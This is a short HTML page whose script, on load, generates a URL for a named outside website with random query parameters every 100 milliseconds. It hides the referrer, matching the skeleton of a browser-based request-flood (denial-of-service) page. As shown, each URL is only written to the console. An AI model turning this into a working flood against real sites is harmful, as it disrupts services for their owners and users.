<html>
  <head>
  <meta name="referrer" content="no-referrer" />
    <script>

        var doit = function(target) {
            console.log(target);
        };

        var start_it = function(target){

          setInterval(function() {

            doit(target+(target.indexOf('?') > 0 ? '&' : '?')+Math.random().toString(36).substr(2, 7)+'='+Math.random().toString(36).substr(2, 7));

          }, 100);

        };

  </script>
  </head>

<body onload="start_it('https://www.smokturkey.org/?a=1');"></body>
</html>
